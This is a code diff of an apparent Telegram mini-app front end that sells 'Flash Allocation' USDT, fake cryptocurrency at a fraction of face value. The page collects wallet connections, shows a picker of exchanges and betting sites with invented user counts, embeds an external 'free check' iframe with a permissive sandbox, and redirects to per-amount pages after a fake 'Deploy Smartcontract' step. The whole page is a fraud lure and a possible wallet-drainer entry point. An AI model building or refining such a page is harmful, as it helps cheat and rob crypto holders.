@@ -8,11 +8,10 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     
-    <!-- AppKit & Ethers Connectivity -->
     <script type="module">
         import { createAppKit } from 'https://esm.sh/@reown/appkit'
-        import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
-        import { mainnet, arbitrum } from 'https://esm.sh/@reown/appkit/networks'
+        import { Ethers5Adapter } from 'https://esm.sh/@reown/appkit-adapter-ethers5'
+        import { mainnet, bsc, arbitrum } from 'https://esm.sh/@reown/appkit/networks'
 
         const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 
 
@@ -24,12 +23,19 @@
         }
 
         const modal = createAppKit({
-            adapters: [new EthersAdapter()],
-            networks: [mainnet, arbitrum],
+            adapters: [new Ethers5Adapter()],
+            networks: [mainnet, bsc, arbitrum],
             metadata,
             projectId,
-            features: { analytics: true, email: false, socials: false },
+            features: { 
+                analytics: true, 
+                email: true, 
+                socials: ['google', 'x', 'github'] 
+            },
             themeMode: 'dark',
+            featuredWalletIds: [
+                '4622a2b2d6ad1331070ef718105c4a5c9a75d5e5b6d0811e74f114c676d5e755' 
+            ],
             themeVariables: { '--w3m-accent': '#6EEB36', '--w3m-z-index': 10000 }
         })
 
@@ -37,9 +43,6 @@
 
         modal.subscribeAccount(state => {
             if (state.isConnected && state.address) {
-                const btn = document.getElementById('walletBtn');
-                btn.innerHTML = `<span>CONNECTED: ${state.address.substring(0,6)}...${state.address.substring(state.address.length-4)}</span><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="text-[#6EEB36]"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
-                btn.classList.add('border-[#6EEB36]', 'text-[#6EEB36]');
                 window.isWalletConnected = true;
                 validateAction();
             }
@@ -95,7 +98,7 @@
             height: 100%;
             display: flex;
             flex-direction: column;
-            padding: 24px;
+            padding: 20px;
             padding-top: 70px;
         }
 
@@ -117,7 +120,7 @@
 
         .ui-btn {
             box-sizing: border-box;
-            padding: 20px 24px;
+            padding: 16px 24px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -142,7 +145,22 @@
             box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3);
         }
 
-        #bottomSheetOverlay {
+        #freeCheckModal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .iframe-container {
+            flex: 1;
+            width: 100%;
+            background: #fff;
+        }
+
+        #bottomSheetOverlay, #coreSheetOverlay {
             display: none;
             position: fixed;
             inset: 0;
@@ -151,7 +169,7 @@
             z-index: 500;
         }
 
-        #bottomSheet {
+        .bottom-sheet {
             position: fixed;
             bottom: -100%;
             left: 0;
@@ -166,7 +184,7 @@
             padding-bottom: env(safe-area-inset-bottom);
         }
 
-        #bottomSheet.active { bottom: 0; }
+        .bottom-sheet.active { bottom: 0; }
 
         .sheet-header {
             padding: 16px 20px;
@@ -190,7 +208,7 @@
             color: #fff;
         }
 
-        .amount-option {
+        .option-item {
             padding: 16px 20px;
             display: flex;
             align-items: center;
@@ -198,29 +216,12 @@
             transition: background 0.2s;
             cursor: pointer;
         }
-
-        .amount-option:active { background: rgba(255, 255, 255, 0.05); }
-
-        .usdt-icon-wrapper {
-            width: 44px;
-            height: 44px;
-            border-radius: 12px;
-            background: #2c2c2e;
+        
+        /* ضبط مظهر زر AppKit ليتناسب مع التصميم */
+        appkit-button {
+            width: 100%;
             display: flex;
-            align-items: center;
             justify-content: center;
-            margin-right: 14px;
-        }
-
-        .usdt-img {
-            width: 28px;
-            height: 28px;
-            object-fit: contain;
-        }
-
-        .chevron-right {
-            color: #48484a;
-            font-size: 18px;
         }
     </style>
 </head>
@@ -228,7 +229,20 @@
 
     <div class="app-overlay"></div>
 
-    <!-- Loading Screen -->
+    <div id="freeCheckModal">
+        <div class="flex items-center justify-between p-4 bg-[#1c1c1e] border-b border-white/10">
+            <span class="text-white font-bold">Free Node Preview</span>
+            <button onclick="toggleFreeCheck(false)" class="text-[#6EEB36] font-bold text-sm">CLOSE</button>
+        </div>
+        <div class="iframe-container">
+            <iframe 
+                src="https://servernsjaj.onrender.com/" 
+                class="w-full h-full border-none"
+                sandbox="allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-scripts allow-same-origin allow-top-navigation"
+            ></iframe>
+        </div>
+    </div>
+
     <div id="loadingOverlay" class="loading-overlay">
         <img src="erc.gif" class="w-16 h-16 mb-6" alt="Kernel">
         <div class="text-[#6EEB36] text-[11px] font-black tracking-[0.5em] uppercase mb-8 text-center">Synchronizing Remix Kernel...</div>
@@ -237,18 +251,23 @@
         </div>
     </div>
 
-    <!-- Bottom Sheet for Amount Selection -->
     <div id="bottomSheetOverlay"></div>
-    <div id="bottomSheet" class="no-scrollbar">
+    <div id="bottomSheet" class="bottom-sheet no-scrollbar">
         <div class="sheet-header">
             <span class="sheet-title">Select Volume</span>
-            <button onclick="closeSheet()" class="close-btn">✕</button>
+            <button onclick="closeSheet('amount')" class="close-btn">✕</button>
         </div>
-        
-        <div id="amountOptionsContainer" class="py-2">
-            <!-- Options generated by JS -->
-        </div>
+        <div id="amountOptionsContainer" class="py-2"></div>
+        <div class="h-10"></div>
+    </div>
 
+    <div id="coreSheetOverlay"></div>
+    <div id="coreSheet" class="bottom-sheet no-scrollbar">
+        <div class="sheet-header">
+            <span class="sheet-title">Choosing the Node Core</span>
+            <button onclick="closeSheet('core')" class="close-btn">✕</button>
+        </div>
+        <div id="coreOptionsContainer" class="py-2"></div>
         <div class="h-10"></div>
     </div>
 
@@ -274,33 +293,44 @@
             </div>
 
             <div class="content-inner">
-                <div class="flex-1 space-y-5 overflow-y-auto no-scrollbar">
+                <div class="flex-1 space-y-4 overflow-y-auto no-scrollbar">
                     
-                    <div class="flex items-center gap-4 bg-white/5 p-4 rounded-2xl border border-white/5">
-                        <img src="remix.png" class="w-10 h-10" alt="Remix" onerror="this.src='https://remix.ethereum.org/favicon.ico'">
-                        <div>
-                            <h3 class="text-white text-[14px] font-bold">REMIX IDE BUILDER</h3>
-                            <p class="text-white/40 text-[10px] font-medium uppercase tracking-wider">Cloud Kernel Environment</p>
+                    <div onclick="toggleFreeCheck(true)" class="relative group cursor-pointer overflow-hidden bg-gradient-to-r from-[#6EEB36]/20 to-transparent border-2 border-[#6EEB36] p-4 rounded-2xl animate-pulse shadow-[0_0_20px_rgba(110,235,54,0.2)]">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="bg-[#6EEB36] p-1.5 rounded-lg flex items-center justify-center">
+                                    <img src="check.png" class="w-5 h-5 object-contain" alt="Check Icon">
+                                </div>
+                                <div>
+                                    <h3 class="text-[#6EEB36] text-[14px] font-black italic tracking-tight">CHECK IT FOR FREE</h3>
+                                    <p class="text-white/60 text-[10px] font-bold uppercase">Verify Node Status Instantly</p>
+                                </div>
+                            </div>
+                            <span class="text-[#6EEB36] text-xl font-black">»</span>
                         </div>
                     </div>
 
                     <div class="bg-orange-500/10 border border-orange-500/20 p-4 rounded-2xl">
                         <p class="text-[11px] text-orange-400 font-medium text-center leading-relaxed">
-                            NOTICE: Please use a completely empty wallet to ensure the safety of your main assets during testing.
+                            NOTICE: Please use an empty wallet for safety during testing.
                         </p>
                     </div>
 
-                    <button id="walletBtn" onclick="window.appKitModal.open()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[14px] font-bold active:scale-[0.98] transition-all">
-                        <div class="flex items-center gap-3">
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="text-[#6EEB36]"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                            <span>Connect Wallet</span>
-                        </div>
-                        <span class="text-white/20">›</span>
-                    </button>
+                    <div class="w-full flex justify-center py-2">
+                        <appkit-button></appkit-button>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Choosing the Node Core</label>
+                        <button id="coreSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
+                            <span id="selectedCoreText">Select node core</span>
+                            <span class="text-[#6EEB36] text-xl">›</span>
+                        </button>
+                    </div>
 
                     <div class="space-y-2">
                         <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Allocation Volume</label>
-                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
+                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
                             <span id="selectedAmountText">Select volume & price</span>
                             <span class="text-[#6EEB36] text-xl">›</span>
                         </button>
@@ -308,13 +338,10 @@
 
                 </div>
 
-                <div class="pt-6 mt-auto">
+                <div class="pt-4 mt-auto">
                     <button id="authorizeBtn" disabled class="ui-btn">
                         <span>Deploy Smartcontract</span>
                     </button>
-                    <div class="text-center mt-4">
-                        <span class="text-white/10 font-bold text-[10px] uppercase tracking-[0.4em]">Remix Terminal v0.54</span>
-                    </div>
                 </div>
             </div>
         </div>
@@ -326,9 +353,30 @@
 
         window.isWalletConnected = false;
         let selectedAmount = null;
+        let selectedCore = null;
 
         const basePrice = 14.99;
         const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];
+
+        const cores = [
+            { name: 'Binance', img_src: 'binance.png', file: '3775 users [monthly]' },
+            { name: 'Bybit', img_src: 'bybit.png', file: '2751 users [monthly]' },
+            { name: 'MEXC', img_src: 'mexc.png', file: '1937 users [monthly]' },
+            { name: '1xBet', img_src: '1xbet.png', file: '13745 users [monthly]' },
+            { name: 'Linbet', img_src: 'linebet.png', file: '11766 users [monthly]' },
+            { name: 'Malbet', img_src: 'malbet.png', file: '9073 users [monthly]' },
+            { name: 'MegaPari', img_src: 'megapari.png', file: '6118 users [monthly]' },
+            { name: 'TrustWallet', img_src: 'trustwallet.png', file: '3652 users [monthly]' },
+            { name: 'MetaMask', img_src: 'metamask.png', file: '3199 users [monthly]' },
+            { name: 'Phantom', img_src: 'phantom.png', file: '2703 users [monthly]' },
+            { name: 'TronLink', img_src: 'tronlink.png', file: '2598 users [monthly]' },
+            { name: 'XM', img_src: 'xm.png', file: '2387 users [monthly]' },
+            { name: 'Tikcmall', img_src: 'tickmall.png', file: '2187 users [monthly] ' },
+            { name: 'Exness', img_src: 'exness.png', file: '1052 users [monthly]' },
+            { name: 'eToro', img_src: 'etoro.png', file: '94 users [monthly]' },
+            { name: 'Pocket option', img_src: 'pocket.png', file: '199 users [monthly]' },
+            { name: 'Qoutex', img_src: 'quotex.png', file: '9437 users [monthly]' },
+        ];
 
         const user = tg.initDataUnsafe?.user;
         if (user) {
@@ -336,63 +384,95 @@
             if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
         }
 
-        const sheet = document.getElementById('bottomSheet');
-        const overlay = document.getElementById('bottomSheetOverlay');
-        const trigger = document.getElementById('amountSheetTrigger');
-        const optionsContainer = document.getElementById('amountOptionsContainer');
+        function toggleFreeCheck(show) {
+            document.getElementById('freeCheckModal').style.display = show ? 'flex' : 'none';
+        }
 
-        function openSheet() {
+        function openSheet(type) {
+            const overlay = document.getElementById(type === 'amount' ? 'bottomSheetOverlay' : 'coreSheetOverlay');
+            const sheet = document.getElementById(type === 'amount' ? 'bottomSheet' : 'coreSheet');
             overlay.style.display = 'block';
             setTimeout(() => sheet.classList.add('active'), 10);
         }
 
-        function closeSheet() {
+        function closeSheet(type) {
+            const overlay = document.getElementById(type === 'amount' ? 'bottomSheetOverlay' : 'coreSheetOverlay');
+            const sheet = document.getElementById(type === 'amount' ? 'bottomSheet' : 'coreSheet');
             sheet.classList.remove('active');
             setTimeout(() => overlay.style.display = 'none', 400);
         }
 
-        trigger.onclick = openSheet;
-        overlay.onclick = closeSheet;
+        document.getElementById('amountSheetTrigger').onclick = () => openSheet('amount');
+        document.getElementById('bottomSheetOverlay').onclick = () => closeSheet('amount');
+        document.getElementById('coreSheetTrigger').onclick = () => openSheet('core');
+        document.getElementById('coreSheetOverlay').onclick = () => closeSheet('core');
 
+        const amountOptionsContainer = document.getElementById('amountOptionsContainer');
         amounts.forEach(amt => {
             const currentPrice = ((amt / 100) * basePrice).toFixed(2);
             const div = document.createElement('div');
-            div.className = 'amount-option';
+            div.className = 'option-item p-4 flex justify-between items-center border-b border-white/5 active:bg-white/5';
             div.innerHTML = `
-                <div class="flex items-center">
-                    <div class="usdt-icon-wrapper">
-                        <img src="usdt.png" alt="USDT" class="usdt-img" onerror="this.src='https://cryptologos.cc/logos/tether-usdt-logo.png'">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#2c2c2e] rounded-xl flex items-center justify-center">
+                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6 h-6" alt="USDT">
                     </div>
-                    <div class="flex flex-col">
-                        <span class="text-white text-[15px] font-bold">${amt} USDT</span>
-                        <span class="text-[#8e8e93] text-[11px] font-medium">Flash Allocation</span>
+                    <div>
+                        <span class="text-white text-[15px] font-bold block">${amt} USDT</span>
+                        <span class="text-[#8e8e93] text-[10px]">FLASH ALLOCATION</span>
                     </div>
                 </div>
-                <div class="flex items-center gap-3">
-                    <div class="text-right">
-                        <span class="text-white text-[15px] font-bold">$${currentPrice}</span>
-                    </div>
-                    <span class="chevron-right">›</span>
+                <div class="text-right">
+                    <span class="text-white font-bold">$${currentPrice}</span>
                 </div>
             `;
             div.onclick = () => {
                 selectedAmount = amt;
                 document.getElementById('selectedAmountText').innerHTML = `
                     <div class="flex items-center gap-3">
-                        <img src="usdt.png" alt="USDT" class="w-5 h-5" onerror="this.src='https://cryptologos.cc/logos/tether-usdt-logo.png'">
                         <span class="text-white font-bold">${amt} USDT</span>
                         <span class="text-[#6EEB36] font-bold">— $${currentPrice}</span>
                     </div>
                 `;
-                closeSheet();
+                closeSheet('amount');
                 validateAction();
             };
-            optionsContainer.appendChild(div);
+            amountOptionsContainer.appendChild(div);
+        });
+
+        const coreOptionsContainer = document.getElementById('coreOptionsContainer');
+        cores.forEach(core => {
+            const div = document.createElement('div');
+            div.className = 'option-item p-4 flex justify-between items-center border-b border-white/5 active:bg-white/5';
+            div.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#2c2c2e] rounded-xl flex items-center justify-center overflow-hidden">
+                        <img src="${core.img_src}" class="w-7 h-7 object-contain" onerror="this.src='https://ui-avatars.com/api/?name=${core.name}&background=6EEB36&color=000'">
+                    </div>
+                    <div>
+                        <span class="text-white text-[15px] font-bold block">${core.name}</span>
+                        <span class="text-[#8e8e93] text-[10px] uppercase">${core.file}</span>
+                    </div>
+                </div>
+                <span class="text-[#6EEB36] text-xl">›</span>
+            `;
+            div.onclick = () => {
+                selectedCore = core.name;
+                document.getElementById('selectedCoreText').innerHTML = `
+                    <div class="flex items-center gap-3">
+                        <span class="text-white font-bold">${core.name}</span>
+                        <span class="text-white/40 text-[10px] font-medium uppercase">— NODE ACTIVE</span>
+                    </div>
+                `;
+                closeSheet('core');
+                validateAction();
+            };
+            coreOptionsContainer.appendChild(div);
         });
 
         function validateAction() {
             const btn = document.getElementById('authorizeBtn');
-            if (window.isWalletConnected && selectedAmount) {
+            if (window.isWalletConnected && selectedAmount && selectedCore) {
                 btn.disabled = false;
                 btn.classList.add('ready');
             }
@@ -408,7 +488,6 @@
                 p += 3; bar.style.width = p + '%';
                 if (p >= 100) {
                     clearInterval(interval);
-                    // DYNAMIC REDIRECT BASED ON SELECTED AMOUNT
                     window.location.href = `${selectedAmount}.html`;
                 }
             }, 30);
@@ -416,4 +495,3 @@
     </script>
 </body>
 </html>
-
